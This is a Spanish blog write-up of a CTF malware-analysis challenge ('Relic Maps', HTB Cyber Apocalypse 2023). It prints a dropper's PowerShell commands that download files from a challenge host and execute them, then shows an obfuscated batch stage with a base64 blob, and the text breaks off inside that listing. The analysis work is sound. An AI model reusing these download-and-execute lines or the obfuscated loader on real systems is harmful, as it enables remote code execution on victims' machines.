<!doctype html><html lang="es"><head><title>Relic Maps | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="HTB CA 2023. An谩lisis de _malware_. Desofuscaci贸n de Batch y PowerShell. Cifrado AES. Descompilaci贸n de C# .NET"><meta name="image" content="https://7rocky.github.io/images/forensics.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HTB CA 2023. An谩lisis de _malware_. Desofuscaci贸n de Batch y PowerShell. Cifrado AES. Descompilaci贸n de C# .NET"><meta itemprop="keywords" content><meta itemprop="name" content="Relic Maps"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="HTB CA 2023. An谩lisis de _malware_. Desofuscaci贸n de Batch y PowerShell. Cifrado AES. Descompilaci贸n de C# .NET"><meta property="og:image" content="https://7rocky.github.io/images/forensics.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Relic Maps"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/relic-maps/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="HTB CA 2023. An谩lisis de _malware_. Desofuscaci贸n de Batch y PowerShell. Cifrado AES. Descompilaci贸n de C# .NET"><meta name="twitter:description" content="HTB CA 2023. An谩lisis de _malware_. Desofuscaci贸n de Batch y PowerShell. Cifrado AES. Descompilaci贸n de C# .NET"><meta name="twitter:image" content="https://7rocky.github.io/images/forensics.png"><meta name="twitter:title" content="Relic Maps"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/relic-maps/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><script>alert("Buy me a beer plz")</script><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/other/htb-cyber-apocalypse/relic-maps/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB CYBER APOCALYPSE</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/relic-maps/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/relic-maps/&amp;text=Relic%20Maps" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/relic-maps/&amp;title=Relic%20Maps" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Relic Maps</h1><p class="mb4 f6 dib tracked">6 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#an谩lisis-de-_malware_">An谩lisis de <em>malware</em></a><ul><li><a href="#desofuscaci贸n-de-batch">Desofuscaci贸n de Batch</a></li><li><a href="#desofuscaci贸n-de-powershell">Desofuscaci贸n de PowerShell</a></li><li><a href="#descompilaci贸n-de-ejecutable-windows">Descompilaci贸n de ejecutable Windows</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Tenemos esta descripci贸n para el reto:</p><blockquote><p><em>Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows? Investigate the given attachment and figure out what&rsquo;s going on and get the flag. The link is to <code>http://relicmaps.htb:/relicmaps.one</code>. The document is still live (relicmaps.htb should resolve to your docker instance)</em>.</p></blockquote><p>El dominio <code>relicmaps.htb</code> indica que debemos apuntar la direcci贸n IP y el puerto remotos all铆.</p><h2 id="an谩lisis-de-_malware_">An谩lisis de <em>malware</em></h2><p>Vamos a descargar <code>/relicmaps.one</code> usando <code>curl</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 165.232.98.69:32012/relicmaps.one -so - | <span class="code-dark-green">file</span> -
/dev/stdin: data

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 165.232.98.69:32012/relicmaps.one -so relicmaps.one  
</code></pre></div><p>El archivo descargado no parece reconocible. Usando <code>strings</code> encontramos c贸digo de PowerShell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -40 <span class="mtku">relicmaps.one</span>
&lt;HTA:APPLICATION icon="#" WINDOWSTATE="normal" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" BORDER="none" SCROLL="no" /&gt;
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    WmiExec = dukpatek(objProcess, objConfig, cmdLine)
Private Function dukpatek(myObjP , myObjC , myCmdL )
    dukpatek = myObjP.Create(myCmdL, Null, myObjC, procId)
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"  
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
' Exec process using WScript.Shell (asynchronous)
    CreateObject("WScript.Shell").Run cmdLine, 0
    If Err.Number &lt;&gt; 0 Or wimResult &lt;&gt; 0 Then
</code></pre></div><p>Parece que el <em>malware</em> est谩 haciendo peticiones HTTP a <code>/uploads/soft/topsecret-maps.one</code> y <code>/get/DdAbds/window.bat</code>.</p><p>Comenzando con <code>topsecret-maps.one</code>, vemos que no lo reconoce:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 165.232.98.69:32012/uploads/soft/topsecret-maps.one -so - | <span class="code-dark-green">file</span> -
/dev/stdin: data

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 165.232.98.69:32012/uploads/soft/topsecret-maps.one -so topsecret-maps.one  
</code></pre></div><p>El otro archivo es un <em>script</em> en Batch:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 165.232.98.69:32012/get/DdAbds/window.bat -so - | <span class="code-dark-green">file</span> -
/dev/stdin: DOS batch file text, ASCII text, with very long lines (4463), with CRLF line terminators  

<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> 165.232.98.69:32012/get/DdAbds/window.bat -so window.bat
</code></pre></div><h3 id="desofuscaci贸n-de-batch">Desofuscaci贸n de Batch</h3><p>Sin embargo, est谩 ofuscado (algunas partes se omiten):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">@echo</span><span class="mtk1"> </span><span class="mtk5">off</span>
<span class="mtk5">set</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">eFlP</span><span class="mtk5">=</span><span class="mtk4">set "</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"ualBOGvshk=ws"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"PxzdwcSExs= /"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"ndjtYQuanY=po"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"cHFmSnCqnE=Wi"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"CJnGNBkyYp=co"</span>

<span class="mtk3">:: ...</span>

<span class="mtk1">%eFlP%</span><span class="mtk4">"chXxviaBCr=we"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"YcnfCLfyyS=in"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"lYCdEGtlPA=.e"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"pMrovuxjjq=he"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"UrPeBlCopW=ll"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"ujJtlzSIGW= C"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"zhNAugCrcK="</span><span class="mtk9 mtki">%~0</span><span class="mtk1">.</span><span class="mtk4">"</span>
<span class="mtk1">%eFlP%</span><span class="mtk4">"ZqjBENExAX=s\"</span>
<span class="mtk5">set</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">VhIy</span><span class="mtk5">=</span><span class="mtk4">set "</span>
<span class="mtk1">%VhIy%</span><span class="mtk4">"dzPrbmmccE=cd"</span>
<span class="mtk1">%VhIy%</span><span class="mtk4">"xQseEVnPet= "</span><span class="mtk9 mtki">%~dp0</span><span class="mtk4">""</span>
<span class="mtk5">set</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk1">eUFw</span><span class="mtk5">=</span><span class="mtk4">set "</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"wxzMwkmbmY=gDBN"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"VavtsuhNIN=F'[-"</span>

<span class="mtk3">:: ...</span>

<span class="mtk1">%eUFw%</span><span class="mtk4">"cYinxarhDL=lit("</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"bIgeRgvTeJ=ap.T"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"acXjUrxrpX=raph"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"SCbDgQuqTU=ay()"</span>
<span class="mtk3">:: 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</span>  
<span class="mtk1">%eUFw%</span><span class="mtk4">"YYKSCuCbgJ=New-"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"YnGvhgYxvb=cm ="</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"vnHosfjdeN=;$Pt"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"LIQYgFxctD=d;$B"</span>

<span class="mtk3"># ...</span>

<span class="mtk1">%eUFw%</span><span class="mtk4">"KsuJogdoiJ= -no"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"djeIEnPaCg=tsWi"</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"brwOvSubJT=e = "</span>
<span class="mtk1">%eUFw%</span><span class="mtk4">"TOqZKQRZli=uZOc"</span>
